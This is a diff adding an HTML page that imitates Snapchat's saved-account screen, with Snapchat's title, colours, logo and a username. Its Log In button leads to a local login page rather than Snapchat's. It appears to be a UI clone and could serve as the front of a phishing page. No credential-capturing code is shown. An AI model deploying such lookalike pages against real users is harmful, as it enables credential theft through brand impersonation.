@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <link rel="shortcut icon" href="/faviconV2.png">
+
+  
+  <title>Snapchat</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500&display=swap" rel="stylesheet">
+  <style>
+    /* General Reset */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: rgba(255, 255, 255, 0) !important;
+      outline: none !important;
+    }
+    
+    /* Body Styling */
+    body {
+      caret-color:transparent;
+      font-family: 'Poppins', sans-serif;
+      background-color: #FFFC00;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+    }
+
+    /* Loading Screen Styling */
+    .loader-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(20, 20, 20, 0.926);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      opacity: 1;
+      visibility: visible;
+      transition: opacity 0.5s ease, visibility 0.5s ease;
+    }
+
+    /* Hide the loader with smooth transition */
+    .loaded .loader-overlay {
+      opacity: 0;
+      visibility: hidden;
+    }
+
+    .container-loader {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .circle {
+      position: absolute;
+      border-radius: 50px;
+    }
+
+    #circle-rotation {
+      width: 35px;
+      height: 35px;
+      border-radius: 50%;
+      border: 3px solid gray;
+      border-bottom-color: transparent;
+      animation: spin 1s linear infinite;
+    }
+
+    #circle-2-rotation {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      border: 3px solid gray;
+      border-bottom-color: transparent;
+      animation: spin2 0.95s linear infinite;
+    }
+
+    @keyframes spin {
+      from {
+        transform: rotate(0deg);
+      }
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    @keyframes spin2 {
+      from {
+        transform: rotate(360deg);
+      }
+      to {
+        transform: rotate(0deg);
+      }
+    }
+
+    /* Main Container */
+    .container {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .logo img {
+      width: 50px;
+      margin-top: 20px;
+    }
+
+    .avatar-container {
+      margin-bottom: 20px;
+    }
+
+    .avatar {
+      width: 120px;
+      height: 120px;
+      border-radius: 50%;
+      border: 4px solid #FFFC00;
+      background-color: #fffd80;
+    }
+
+    .avatar img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .username {
+      margin-top: -10px;
+      font-size: 15px;
+      font-weight: 600;
+      color: black;
+    }
+
+    .remove-account {
+      font-size: 12px;
+      color: #00A6FF;
+      margin-top: 10px;
+      margin-bottom: 40px;
+      cursor: pointer;
+      font-weight: 600;
+
+    }
+
+    .login-btn {
+  background-color: #00A6FF;
+      color: white;
+      border: none;
+      font-size: 16px;
+      width: 175px;
+      padding: 12px 0;
+      border-radius: 25px;
+      margin-bottom: 76px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); /* Shadow effect */
+    }
+
+    .login-btn:hover {
+      background-color: #008ed6;
+    }
+
+    .button-container {
+      display: flex;
+      width: 100%;
+      position: fixed;
+      bottom: 0;
+    }
+
+    .button {
+      flex: 1;
+      height: 50px;
+      font-size: 16px;
+      text-align: center;
+      line-height: 50px;
+      background-color: transparent;
+      border: none;
+      font-weight: 600;
+    }
+
+    .button:nth-child(2) {
+      border-left: 2px solid #dfdb00;
+    }
+
+    .button:active {
+      opacity: 0.8;
+    }
+    a{
+    text-decoration: none;
+  }
+  </style>
+</head>
+<body>
+  <!-- Loading Screen -->
+  <div class="loader-overlay" id="loading">
+    <div class="container-loader">
+      <div id="circle-rotation" class="circle"></div>
+      <div id="circle-2-rotation" class="circle-2"></div>
+    </div>
+  </div>
+
+  <!-- Snapchat Logo -->
+  <div class="logo">
+    <img src="/icon.svg" alt="Snapchat Logo">
+  </div>
+
+  <div class="container">
+    <div class="avatar-container">
+      <div class="avatar">
+        <img src="/31151407-102973017962_11-s5-v1.webp" alt="User Avatar">
+      </div>
+    </div>
+
+    <div class="username">tejazmali</div>
+   <a href="https://help.snapchat.com/hc/en-us/articles/7012328360596-How-do-I-deactivate-or-delete-my-Snapchat-account"> <div class="remove-account">Remove account</div></a>
+  </div>
+
+  <button class="login-btn" onclick="window.location.href='/login.html';">Log In</button>
+
+  <div class="button-container">
+    <button class="button" onclick="window.location.href='https://accounts.snapchat.com/v2/signup';">Sign Up</button>
+    <button class="button" onclick="window.location.href='/login.html';">Switch Account</button>
+  </div>
+
+  <script>
+    // Ensure the loader hides when the page fully loads
+    window.onload = function () {
+      // Add the 'loaded' class to the body to hide the loader
+      document.body.classList.add('loaded');
+    };
+  </script>
+</body>
+</html>
